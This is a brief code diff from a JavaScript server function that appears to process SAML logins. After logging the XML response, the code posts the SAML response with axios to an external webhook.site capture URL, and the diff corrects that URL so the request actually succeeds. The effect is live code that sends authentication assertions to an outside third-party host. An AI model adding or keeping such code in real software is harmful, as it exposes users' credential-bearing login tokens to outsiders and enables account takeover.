@@ -479,7 +479,7 @@ function _runServer(argv) {
                               console.log(prettyPrintXml(response.toString(), 4));
 
 
-                              axios.post('https://webhook.site/#!/d4060c55-7e72-49e1-9f27-20934bd88d41', {
+                              axios.post('https://webhook.site/d4060c55-7e72-49e1-9f27-20934bd88d41', {
                                 saml: saml_response
                               })
                               .then(function (response) {
